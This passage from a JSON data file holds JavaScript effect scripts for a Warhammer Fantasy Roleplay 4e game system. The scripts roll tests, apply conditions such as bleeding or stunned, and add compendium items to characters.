this.effect.id});\n","Fvlc4RkeF4dHjW3m":"let caster = this.effect.sourceActor\nif (caster && (this.actor.has(game.i18n.localize(\"NAME.Undead\")) || this.actor.has(game.i18n.localize(\"NAME.Daemonic\")))) {\n    let wp = caster.system.characteristics.wp.value\n    if (wp > this.actor.system.characteristics.t.value) {\n        if (this.actor.has(game.i18n.localize(\"NAME.Unstable\"))) {\n            this.actor.update({ \"system.status.wounds.value\": 0 })\n            this.actor.addCondition(\"dead\")\n        }\n        else {\n            fromUuid(\"Compendium.wfrp4e-core.items.D0ImWEIMSDgElsnl\").then(item => {\n                this.actor.createEmbeddedDocuments(\"Item\", [item.toObject()], { fromEffect: this.effect.id })\n                ChatMessage.create({ content: `Added Unstable to ${this.actor.prototypeToken.name}`, speaker: { alias: caster.name } })\n            })\n        }\n    }\n}","Fwk8WA8NfRivLFWJ":"return args.skill?.name === \"Entertain (Singing)\";","G1RletYc6BzigJrK":"let ablaze = parseInt(this.effect.sourceTest.result.SL) + 5\nargs.actor.addCondition(\"ablaze\", ablaze)","G7sFEnJlXZvfXL3V":"if (this.item.system.quantity.value)\n{\n\tthis.item.system.reduceQuantity();\n\tlet actor = Array.from(game.user.targets)[0]?.actor || this.actor;\n    let effectData = this.item.effects.contents[1].convertToApplied();\n\teffectData.flags.wfrp4e.sourceItem = this.item.uuid\n\tactor.applyEffect({effectData : [effectData]})\n}\nelse\n{\n\tthis.script.scriptNotification(\"None left!\", \"error\")\n}","GAO8AozttWOyRkta":"if (!args.flags.lostHand)\n{\n\targs.fields.lostHand = true;\n\targs.fields.modifier += -20;\n}","GEfWIFBSrXt0ldBM":"(await new Roll(\"1d10\").roll()).toMessage(this.script.getChatData())\nawait this.actor.addCondition(\"dead\")","GFaTz8f6PBNWrlad":"let test = await this.actor.setupCharacteristic(\"wp\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, context : {failure : `<strong>Confused</strong>: Determine behaviour by @Table[bewilder] Table.`}})\nawait test.roll();\nreturn test.failed","GFkVnx4m9OwYsKGH":"args.actor.flags.ambi+= 1","GNl5Zk7BZ2jhRV1I":"if (args.item.type == \"armour\")\n{\n    args.item.system.AP.head = 0;\n}","GOq4TcnWbfyfCo2V":"this.script.scriptNotification(`Healed ${this.actor.characteristics.t.bonus * 2} Wounds`)\nawait this.actor.modifyWounds(this.actor.characteristics.t.bonus * 2)\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - Side Effects`,fields : {difficulty : \"difficult\"}})\nawait test.roll();\nif (test.failed)\n{\n    let roll = await new Roll(\"1d10\").roll();\n    await roll.toMessage(this.script.getChatData())\n    if (roll.total <= 3)\n    {\n        this.actor.addCondition(\"blinded\", 3)\n    }\n    else if (roll.total <= 6)\n    {\n        this.actor.addCondition(\"broken\");\n    }\n    else if (roll.total <= 9)\n    {\n        this.actor.addCondition(\"stunned\");\n    }\n    else if (roll.total == 10)\n    {\n        this.actor.addConditon(\"unconscious\")\n    }\n}","GRfCxtYzmEx2LYU7":"if (args.totalWoundLoss >= 1)\n{\n    let roll = await new Roll(\"1d10\").roll();\n    await roll.toMessage(this.script.getChatData());\n    if (roll.total == 9)\n    {\n        this.script.scriptMessage(`Two @UUID[Compendium.wfrp4e-eis.actors.iDy8SDTwJSlCzZMl]{Blue Horror of Tzeentch} claw their way out of ${this.actor.name}'s screaming flesh, killing them in the process.`, {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n    }\n}","GTZUO73pUJKpM1JB":"    let roll = await new Roll(\"1d10\").roll();\n    game.dice3d?.showForRoll(roll);\n    this.script.scriptMessage(await this.actor.applyBasicDamage(roll.total, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, suppressMsg : true}))\n","GUkpYdPwoC5pc9BT":"return !args.weapon?.system.properties.flaws.crewed","GZFsuynUhgZqwTGo":"if (args.totalWoundLoss >= 1)\n{\n    let test = await args.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, context: { failure: \"Gained a Poisoned Condition\", success: \"Resisted the poison\" }})\n    await test.roll();\n    if (test.failed)\n    {\n        args.actor.addCondition(\"poisoned\");\n    }\n}\n    ","GbPEy22VuCNzlNv2":"return !this.actor.isMounted || (!args.skill?.name?.includes(game.i18n.localize(\"NAME.Ride\")) && !args.options.dodge)","Gc8S5TYlVdV8NnOT":"let test = await args.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  \" - \" + this.effect.name, context: { failure: \"Gained a Broken Condition\", success: \"Resisted the Broken Condition\" } })\n\n await test.roll();\n\n if (!test.succeeded)\n {\n    args.actor.addCondition(\"broken\");\n }","GcIQtshex11AMmh2":"if (this.item.system.isEquipped)\n{\n    let removeRepeater = false\n    if(!this.item.system.offhand.value) // main\n    {\n        let offhandUsed = this.actor.itemTypes.weapon.find(i => i.system.isEquipped && i.system.offhand.value)\n        if (offhandUsed)\n        {\n            removeRepeater = true;\n        }\n    }\n    else // offhand\n    {\n        let mainhandUsed = this.actor.itemTypes.weapon.find(i => i.system.isEquipped && !i.system.offhand.value)\n        if (mainhandUsed)\n        {\n           removeRepeater = true;\n        }\n    }\n    \n    if (removeRepeater)\n    {\n        this.item.system.qualities.value = this.item.system.qualities.value.filter(i => i.name != \"repeater\")\n    }\n}","Gh7OidY6UdpWBS1g":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.KII1gWnxIZ8HzmU5\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","GjkxWj9wCAclM9WA":"let effects = foundry.utils.deepClone(this.item.effects.contents.filter(e => e.active));\n\neffects.splice(effects.length - 1);\n\nif (effects.length == 0)\n{\n    return this.script.scriptNotification(\"All Effects have been used. Reset to select them again\")\n}\nlet choice = await ItemDialog.create(effects, 1, \"Choose Power to Gain\");\n\nif (choice[0])\n{\n    choice[0].update({disabled : true})\n    let effect = choice[0].convertToApplied();\n    effect.name += ` (${this.effect.name})`\n    this.actor.createEmbeddedDocuments(\"ActiveEffect\", [effect]);\n}","GrF6tQ08jgKmUH4i":"return ![\"ws\", \"bs\", \"s\", \"ag\", \"i\"].includes(args.characteristic)","GsAyB5xnK3ASeoah":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Carpentry)';\nconst difficulty = 'easy';\nconst target = 20;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","GuUCErVbk5hrFzR3":"args.multiplier.tb += 1","GuxbvztcvzJz2oH1":"args.item.system.qualities.value = [];","GzSFlqL1YrIK1dxh":"let items = await Promise.all([\"Compendium.wfrp4e-wom.items.Item.EjGYZ4CgX2jZW7Ot\",\n\"Compendium.wfrp4e-wom.items.Item.O2v9RQiFf0obskP5\",\n\"Compendium.wfrp4e-wom.items.Item.2cv6hhZ57iV6z5Il\",\n\"Compendium.wfrp4e-wom.items.Item.YgDEUO0G0XcqQJqg\",\n\"Compendium.wfrp4e-wom.items.Item.J6K5TPxI8qIGQKKH\",\n\"Compendium.wfrp4e-wom.items.Item.K9FPtiDLwTkC7FuO\",\n\"Compendium.wfrp4e-wom.items.Item.CkMYRYCLrkMnyVm5\",\n\"Compendium.wfrp4e-wom.items.Item.0Xdm4r7l2EwC4fcg\"].map(fromUuid));\n\nlet choice = await game.wfrp4e.apps.ItemDialog.create(items, 1, \"Select Wind\")\n//this.actor.createEmbeddedDocuments(\"Item\", items);\n\nthis.item.update(choice[0]?.toObject(), {diff: false, recursive : false});\n\n//this.actor.items.getName(this.effect.item.name).delete() // For some reason this.effect.item.delete() throws an error\n\n","GzsuEg7gZy1f0ljy":"let bleeding = this.actor.hasCondition(\"bleeding\")\nif (bleeding)\n{\n   this.script.scriptNotification(`Cleared ${bleeding.conditionValue} Bleeding Conditions`)\n   bleeding.delete();  \n}\nelse \n{\n   this.script.scriptNotification(`No Bleeding Conditions`)\n}","H06Ysj7oPiemW7S6":"if (args.test.options.income && !args.test.options.criminal)\n{\n    args.test.options.criminal = true;\n    let currentCareer = args.test.actor.system.currentCareer;\n    let coin = {1 : \"b\", 2 : \"s\", 3 : \"s\", 4 : \"g\"}[currentCareer.system.level.value] // b, s, or g maps to 2d10, 1d10, or 1 respectively (takes the first letter)\n    let term = {1 : \"bp\", 2 : \"ss\", 3 : \"ss\", 4 : \"gc\"}[currentCareer.system.level.value] // b, s, or g maps to 2d10, 1d10, or 1 respectively (takes the first letter)\n    let dieAmount = {1 : \"2d10\", 2 : \"1d10\", 3 : \"2d10\", 4 : \"1\"}[currentCareer.system.level.value] // b, s, or g maps to 2d10, 1d10, or 1 respectively (takes the first letter)\n    dieAmount = parseInt(dieAmount[0]) * this.item.system.Advances;     // Multilpy that first letter by your standing (Brass 4 = 8d10 pennies)\n    if (coin != \"g\") // Don't roll for gold, just use standing value\n    {\n        dieAmount = dieAmount + \"d10\";\n    }\n    let moneyEarned = (await new Roll(dieAmount.toString()).roll()).total;\n    let moneyString = `${moneyEarned}${coin}`\n    let transactionString = `${moneyEarned}${term}`\n\n    this.script.scriptMessage(`<a class=\"money-drag\" data-amt=\"${moneyString}\"><strong>Earned an additional ${game.wfrp4e.market.amountToString(game.wfrp4e.market.parseMoneyTransactionString(transactionString))}</strong></a>`, {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n}","H1z3nWW7Rj3Oisxy":"return args.type != \"channelling\"","H2CJvApKMnfGNNoo":" if (args.test.item?.type == \"skill\" && args.test.item.name.includes(game.i18n.localize(\"NAME.Stealth\")))\n{ \n     args.test.result.description = \"Astounding Failure\";\n     args.test.result.outcome = \"failure\";\n       ChatMessage.create({content : \"<em>SQUEAK</em>\", speaker : ChatMessage.getSpeaker({token: this.actor.getActiveTokens()[0]?.document, actor: this.actor})}, {chatBubble : true})\n        AudioHelper.play({ src: `${game.settings.get(\"wfrp4e\", \"soundPath\")}squeek.wav` }, true);\n}","H3Wls12aVWAWTp9J":"this.actor.setupCharacteristic(\"i\", {skipTargets: true, appendTitle :  \" - \" + this.effect.name}).then(test => {\n    test.roll();\n})","H3pZ9UeIzIz3luKh":"args.actor.addCondition(\"bleeding\")\n\nthis.actor.setFlag(\"wfrp4e\", \"isAttached\", args.actor.name)\n\nthis.script.scriptMessage(`Attaches to <strong>${args.actor.name}</strong>`)","H85k4L3yICm7cfIk":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Sail';\nconst difficulty = 'easy';\nconst target = 10;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","HASsi6wYHVALExWq":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, context: { failure: \"1 Corruption Point Gained\" } })\nawait test.roll();\n\nif (test.failed && args.actor.type == \"character\") \n{\n    let msg = \"\"\n    msg += `<p><b>${this.actor.prototypeToken.name}</b> gained a Corruption point</p>`\n    if (test.result.roll % 11 == 0 || test.result.roll == 100)\n    {\n        msg +=  `<b>${args.actor.prototypeToken.name}</b> gains a mutation (@Table[expandedmutatephys]{Physical} or @Table[expandedmutatemental]{Mental}) and gains @UUID[Compendium.wfrp4e-core.items.hiU7vhBOVpVI8c7C]{Chaos Magic (Tzeentch)}`\n    }\n    this.script.scriptMessage(msg, {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n    await this.actor.update({ \"system.status.corruption.value\": parseInt(args.actor.status.corruption.value) + 1 })\n}","HG2fKOfruT5QV3A4":"let lore = await ValueDialog.create(\"Choose Lore\", \"Lore\", \"\", {\"fire\" : \"Fire\", \"death\" : \"Death\", \"metal\" : \"Metal\", \"shadow\" : \"Shadow\"});\n\nlet filters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"system.lore.value\",\n        value : \"petty\"\n    }\n]\n\nlet petty = await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 3, \"Choose 3 Petty Spells\")\n\n\nfilters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"system.lore.value\",\n        value : [\"\"]\n    }\n]\n\nlet arcane = await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 6, \"Choose 6 Arcane Spells\")\n\nlet items = petty.map(i => i.toObject()).concat(arcane.map(i => {\n    let spell = i.toObject();\n    spell.img = `modules/wfrp4e-core/icons/spells/${lore}.png`\n    spell.system.lore.value = lore;\n    return spell;\n}));\n\nthis.actor.createEmbeddedDocuments(\"Item\", items);","HJ2X4ZtXei0BXbxf":"        let choices = await Promise.all([game.wfrp4e.utility.findItemId(\"PzimjNx9Ojq4g6mV\"), game.wfrp4e.utility.findItemId(\"rOPmyLWa37e7s9v6\")])\n        let items = await game.wfrp4e.apps.ItemDialog.create(choices, 1, \"Choose a Skill\")\n\n        items = items.map(i => i.toObject())\n        items.forEach(i => i.system.advances.value = 20)\n\nitems.forEach(i => equip(i))\n\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.data.worn.value = true\n    else if (item.type == \"weapon\")\n        item.data.equipped = true\n    else if (item.type == \"trapping\" && item.data.trappingType.value == \"clothingAccessories\")\n        item.data.worn = true\n}","HKhyn0kijKfzW6cw":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty: \"hard\"}})\nawait test.roll();\nthis.item.updateSource({\"flags.wfrp4e.passed\" : test.succeeded})","HMC6hPND9DWLFfZE":"if (this.item.name.includes(\"(\"))\n{\n\treturn;\n}\n\nlet index = game.packs\n.filter(i => i.metadata.type == \"Item\")\n.reduce((acc, pack) => acc.concat(pack.index.contents), [])\n.filter(i => i.type == \"skill\" && i.name.includes(game.i18n.localize(\"NAME.Lore\")))\n.map(i => {\n\ti.id = i._id\n\treturn i\n})\n\nlet choice = await ItemDialog.create(index, 1, \"Choose a Lore\")\nlet text;\nif (!choice[0])\n{\n    let custom = await Dialog.wait({\n        title : \"Enter Lore\",\n        content : \"<input type='text'>\",\n        buttons : {\n            confirm : {\n                label : game.i18n.localize(\"Confirm\"),\n                callback : (dlg) => {\n                    return dlg.find(\"input\")[0].value\n                }\n            }\n        },\n        default : \"confirm\",\n        close : () => {\n            return \"\"\n        }\n    })   \n    text = custom || \"\"\n}\nelse \n{\n    text = game.wfrp4e.utility.extractParenthesesText(choice[0].name)\n}\n\nawait this.item.updateSource({name : this.item.name + ` (${text})`, \"system.tests.value\" : this.item.system.tests.value.replace(\"chosen Lore\", text)})\nawait this.effect.updateSource({name : this.effect.name + ` (${text})`})","HOt2hHOiHDZ7oBgW":"if ([\"rLeg\", \"lLeg\"].includes(this.effect.getFlag(\"wfrp4e\", \"location\")))\n{\n\targs.actor.details.move.value /= 2\n}\n","HUKzssLxeQo1wbx9":"\n                            let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields: {difficulty : \"average\"}, appendTitle : \" - Wounded\"})\n                            await test.roll();\n                            if (test.failed)\n                            {\n                                fromUuid(\"Compendium.wfrp4e-core.items.kKccDTGzWzSXCBOb\").then(disease => {\n                                    this.actor.createEmbeddedDocuments(\"Item\", [disease.toObject()])\n                                    this.script.scriptNotification(\"Gained \" + disease.name)\n                                })\n                            }\n                            ","HX6CjNapYdC0VmQ8":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.epPBu7x6BRWp2PHG\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","HXJKkmpfxQUOnWOS":"if (!this.item.system.twohanded.value)\n{\n    this.item.system.flaws.value = this.item.system.flaws.value.concat([{name : \"tiring\"}, {name : \"slow\"}])\n}","HYrl5aNMm8BAdqH7":"\n                            let modifier = 0\n                            if (this.effect.name.includes(\"Moderate\"))\n                                modifier = -20\n                            else\n                                modifier = -10\n                            args.fields.modifier += modifier\n                            ","Hcpn1gU58DIKIhty":"if (args.item.type  == \"skill\" && args.item.name == \"Melee (Flail)\")\n{\n     args.item.system.modifier.value += 10;\n}","HfCxNd7mFGZH4s9Y":"// An opponent that takes more than a single Wound from a Warp Blade strike \n// in melee combat must make an Average (+20) Endurance Test \n// or take a Stunned Condition\n\n\nif (args.totalWoundLoss > 1) {\n    let test = await args.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields : {difficulty : \"average\"}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\n    await test.roll();\n    if(test.failed)\n    {\n        await args.actor.addCondition(\"stunned\");\n    }\n}","HiMBS6GeOwEydWYN":"return args.skill?.name != game.i18n.localize(\"NAME.Climb\");","HmImVzvw6ecBy99l":"if (args.opposedTest.result.hitloc.value == \"body\" && args.totalWoundLoss > 0) \n{\n    args.actor.addCondition(\"bleeding\", 2)\n    this.script.scriptNotification(\"Added Bleeding\")\n}","HoNTnPphrJISSQr1":"ChatMessage.create({content : \"<em>Speak and be known to me</em>\", speaker : ChatMessage.getSpeaker({token: this.actor.getActiveTokens()[0]?.document, actor: this.actor})}, {chatBubble : true})","Hq1G30lhJYvtOSNb":"                 \n                            if (args.test.failed)\n                            {\n                                let applicableCharacteristics = [\"ws\", \"bs\", \"s\", \"fel\", \"ag\", \"t\", \"dex\"];\n                                if (applicableCharacteristics.includes(args.preData.characteristic))\n                                {\n                                    this.actor.addCondition(\"stunned\");\n                                }\n                            }","HrOBAXsEX073ReKl":"let skill = `Entertain (Singing)`\nlet currentCareer = this.actor.system.currentCareer;\nlet existingSkill = this.actor.itemTypes.skill.find(i => i.name == skill);\n\nif (!currentCareer) return\n\n\nlet inCurrentCareer = currentCareer.system.skills.includes(skill);\nlet perfectPitchAdded = this.actor.getFlag(\"wfrp4e\", \"perfectPitchAdded\") || {};\nif (existingSkill && inCurrentCareer && !perfectPitchAdded[existingSkill.name])\n{\n\texistingSkill.system.advances.costModifier = -5;\n}\nelse \n{\n\tperfectPitchAdded[skill] = true;\n\tcurrentCareer.system.skills.push(skill);\n\tfoundry.utils.setProperty(this.actor, \"flags.wfrp4e.perfectPitchAdded\", perfectPitchAdded)\n}\n\n\n","HrYchgkdZBiu1yPF":"return args.skill?.name == game.i18n.localize(\"NAME.Climb\");","HwbgUIbpX0D8JLOR":"if (args.opposedTest.result.differenceSL >= 0 && args.opposedTest.result.differenceSL <= 2 && args.opposedTest.result.winner == \"attacker\")\n    this.actor.addCondition(\"bleeding\")","I0Jo6cbNAJtXUloc":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.J9MK0AIaTbvd5oF6\");\nthis.actor.createEmbeddedDocuments(\"Item\", [item.toObject()], {fromEffect : this.effect.id});","I0oRZ7AWde5KI5jw":"return ![\"t\", \"int\"].includes(args.characteristic)","I1J2m5uud84N50Lk":"if ([\"cast\", \"channelling\", \"pray\"].includes(args.type))\n{\n\targs.abort = true;\n\tthis.script.scriptNotification(\"Cannot cast Spells or use Prayers\");\n}\nelse return true;","I7ieW0hNYvvX0KFg":"return args.skill?.name != game.i18n.localize(\"NAME.Heal\");","I93i49wI9ZrDHT4n":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.jt0DmVK9IiF6Sd2h\");\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect: this.effect.id})","I9QAPKbaXwMMMBT4":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {fields : {difficulty: \"average\"}, skipTargets: true, appendTitle :  \" - \" + this.effect.name})\nawait test.roll();\nif(test.failed)\n{\n    await this.actor.addCondition(\"stunned\");\n    let secondTest = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {fields : {difficulty: \"easy\"}, skipTargets: true, appendTitle :  \" - Despair\"})\n    await secondTest.roll();\n    if(secondTest.failed)\n    {\n        this.effect.updateSource({name : \"Taste of Death\"})\n         await this.actor.addCondition(\"fatigued\");\n    }\n    else \n    {\n        return false;\n    }\n}","IAGla7HJlYN0wa4H":"if (args.test.characteristicKey == \"wp\") \n{\n    if (args.test.failed)\n    {\n        this.actor.addSystemEffect(\"convulsions\")\n        this.script.scriptMessage(`Willpower Test failed, <b>${this.actor.prototypeToken.name}</b> gains @Symptom[Convulsions] for [[1d10]] hours`)\n    }\n}","ID8mCcjkl7PCQhDq":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Dodge\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\n\nif(test.failed)\n{\n    let damage = this.effect.sourceItem.system.computeSpellDamage(\"3\", true);\n    this.script.scriptMessage(await this.actor.applyBasicDamage(damage, {suppressMsg: true, damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP}))\n}","IG4zYqtN9fRSYE7q":"args.actor.addCondition(\"ablaze\");","IKiZv9YSFmKmHo6a":"return args.spell?.system.lore.value == \"fire\"","ILqHxk7deotgI3KD":"if (args.item.type != \"weapon\")\n    return\n\nlet reach = args.item.reach.value\nlet reachNum = game.wfrp4e.config.reachNum[reach]\nreachNum = Math.min(reachNum + 2, 7)\n\nlet key = game.wfrp4e.utility.findKey(reachNum, game.wfrp4e.config.reachNum)\n\nargs.item.reach.value = key","IOroJBqTsWvoakJN":"if (args.actorsystem.details.move.oars.value > 0)\n  args.actor.system.details.move.oars.value -= 2;\n","IPPDvZdE8kn3H9z7":"let test = await this.actor.setupSkill(\"Dodge\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`});\nawait test.roll();\n\nif (test.failed)\n{\n   await this.actor.addCondition(\"grappling\")\n}","IR5URcjnCuWBFMoN":"// If a full dose is imbibed, \n// the victim must pass a Hard (-20) Endurance Test.\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields: {difficulty: \"hard\"}})\nawait test.roll()\nif (test.failed)\n{\n    this.script.scriptMessage(`<p><strong>${this.actor.prototypeToken.name}</strong> notices nothing amiss save that they become tired a little earlier than usual. At this point it is still possible to save the victim via a powerful antidote or magical means.</p>\n    <p>Once they fall asleep however, it is almost impossible. At this point the victim must make a <strong>Hard (-20) Endurance</strong> Test. If they fail, they never awaken.</p>`, \n    {\n      whisper: ChatMessage.getWhisperRecipients(\"GM\"), \n      blind: true \n    })\n}\nreturn test.failed;","IR86DuMbVdbGOJYt":"this.actor.addCondition(\"blinded\")","IfEu1hO8sKEZBpvg":"let value = parseInt(this.item.specification.value)\nlet name = this.actor.prototypeToken.name\n\nif (game.user.isGM && game.user.targets.size)\n{\n  game.user.targets.forEach(t => {\n    t.actor.applyFear(value, name)\n  })\n  game.user.updateTokenTargets([]);\n}\nelse \n{\n  game.wfrp4e.utility.postFear(value, name)\n}","IkGegSuQwwVPhrjF":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.pTorrE0l3VybAbtn\")\nlet data = item.toObject();\ndata.system.specification.value = 1\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","Ip8sctF9SIE1Z2vF":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.UnJ25lL8aUzem5JO\")\nlet data = item.toObject();\ndata.system.specification.value = 3\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","IpoOOjYJs6RmVrpb":"if (args.totalWoundLoss > 0)\n{\n    args.attacker.applyEffect({effectUuids : this.effect.sourceItem.effects.contents[1].uuid})\n}","IrkWq7IiFS65bTvC":"if (this.actor.flags.holed.half !== true) return;\nif (this.actor.flags.holed.reminded === true) return;\n\nconst speaker = ChatMessage.getSpeaker({actor: this.actor});\nthis.script.scriptMessage(`<p><b>${speaker.alias}</b> sits heavily in the water. Unless the cargo is waterproof, it loses [[d10]]% of its value.</p>`);\n\nthis.actor.flags.holed.reminded  = true;","IsLAvY9ikR1cOJWw":"return ![\"NAME.Row\", \"NAME.Swim\"].map(i => game.i18n.localize(i)).includes(args.skill?.name);","IslMfFgpgQq2brpu":"if (this.actor.hasCondition(\"broken\"))\n{\n    this.actor.removeCondition(\"broken\")\n    this.script.scriptNotification(`Cannot have Broken`);\n}","IukS0clr1yAleacc":"this.actor.system.characteristics.ag.modifier -= parseInt(this.item.system.location.value) || 1\n\nthis.actor.system.characteristics.ws.modifier -= parseInt(this.item.system.location.value) || 1","IupskvzvoGyD2H5o":"if (this.actor.type != \"character\")\n{\n    return;\n}\n\nlet god = await ValueDialog.create(\"Enter a Deity\", \"Blessed\")\n\nif (god)\n{\n    let prayers = await game.wfrp4e.utility.findAll(\"prayer\", \"Loading Prayers\")\n    let blessings = prayers.filter(p => p.system.god.value.split(\",\").map(i => i.trim().toLowerCase()).includes(god.toLowerCase()) && p.system.type.value == \"blessing\")\n    if (blessings.length)\n    {\n        this.script.scriptNotification(\"Adding \" + blessings.map(i => i.name).join(\", \"))\n        await this.actor.createEmbeddedDocuments(\"Item\", blessings, {fromEffect : this.effect.id})\n    }\n    else \n    {\n        this.script.scriptNotification(`Could not find any Blessings associated with ${god}.`)\n    }\n    this.item.updateSource({name : this.item.name.replace(\"Any\", god)})\n    await this.actor.update({\"system.details.god.value\": god})\n}","IzZcsSngI8TZH4d8":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.fjd1u9VAgiYzhBRp\");\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","IzoOmDywGLqLNljN":"let skill = `Language (Magick)`\nlet currentCareer = this.actor.system.currentCareer;\nlet existingSkill = this.actor.itemTypes.skill.find(i => i.name == skill);\n\nif (!currentCareer) return\n\n\nlet inCurrentCareer = currentCareer.system.skills.includes(skill);\nlet witchAdded = actor.getFlag(\"wfrp4e\", \"witchAdded\") || {};\nif (existingSkill && inCurrentCareer && !witchAdded[existingSkill.name])\n{\n\texistingSkill.system.advances.costModifier = -5;\n}\nelse \n{\n\twitchAdded[skill] = true;\n\tcurrentCareer.system.skills.push(skill);\n\tfoundry.utils.setProperty(this.actor, \"flags.wfrp4e.witchAdded\", witchAdded)\n}","J0IWUhxada2ONowP":"        return args.skill?.name == \"Entertain (Sing)\" || args.skill?.name == \"Entertain (Singing)\" || (args.skill?.name.includes(\"Language\") && (args.skill?.name.includes(\"Magick\") || args.skill?.name.includes(\"Elthárin\") || args.skill?.name.includes(\"Cathayan\")))","J1FPDdrXGctKDTZz":"if (args.equipped)\n{\n    let ward = await fromUuid(\"Compendium.wfrp4e-core.items.Bvd2aZ0gQUXHfCTh\")\n    wardData = ward.toObject()\n    wardData.system.specification.value = \"8\"\n     \n    let mr = await fromUuid(\"Compendium.wfrp4e-core.items.yrkI7ATjqLPDTFmZ\")\n    mrData = mr.toObject()\n    mrData.system.specification.value = 2\n    \n    this.actor.createEmbeddedDocuments(\"Item\", [wardData, mrData], {fromEffect : this.effect.id})\n}\nelse\n{\n    this.effect.deleteCreatedItems()\n}","J8aPichsl25t1QZ9":"this.actor.addCondition(\"entangled\", this.effect.sourceTest.result.SL)","JBoKPBr27C3PMoSD":"return args.skill?.name === game.i18n.localize(\"NAME.Navigation\");","JEbs0WlqhKNDOo5A":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty: \"hard\"}})\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"unconscious\")\n}\n","JFgXyb6bKjZJLmF8":"return args.characteristic == \"ag\"","JQruHprM5R5vZ9DA":"let caster = this.effect.sourceActor;\nif (caster)\n{\n    let healed= caster.system.characteristics.wp.bonus + caster.system.characteristics.int.bonus\n    await this.actor.modifyWounds(healed);\n    this.script.scriptMessage(`<strong>${this.actor.prototypeToken.name}</strong> regains ${healed} Wounds`)\n}\n \n let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields : {difficulty : \"vhard\"}, context : {success : \"1 Corruption point that was gained within the last hour is removed.\", failure: \"Nothing happens\"}})\n await 